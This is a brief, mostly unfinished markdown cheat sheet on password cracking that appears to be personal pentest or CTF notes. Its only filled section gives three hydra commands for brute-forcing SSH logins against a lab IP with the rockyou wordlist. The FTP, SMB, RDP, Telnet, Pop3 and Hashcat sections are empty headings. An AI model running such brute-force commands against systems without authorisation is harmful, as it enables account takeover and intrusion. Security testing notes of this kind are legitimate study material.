# Cracking Techniques

Usually the tools that I always use are hashcat, wfuzz and hydra. 

- [SSH](#ssh)
- [FTP](#ftp)
- [SMB](#smb)
- [RDP](#rdp)
- [Telnet](#rdp)
- [Pop3](#pop3)
- [References](#references)

### SSH

```
# Normal
hydra  -l user -P /opt/rockyou.txt -f 10.10.8.83 ssh 

# Different Port 
hydra  -l user -P /opt/rockyou.txt -f 10.10.8.83 ssh -s 9999

# Many User
hydra  -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 ssh -s 9999
```

### FTP

### SMB

### RDP

### Telnet

### Pop3

### Hashcat

# References

[1] https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux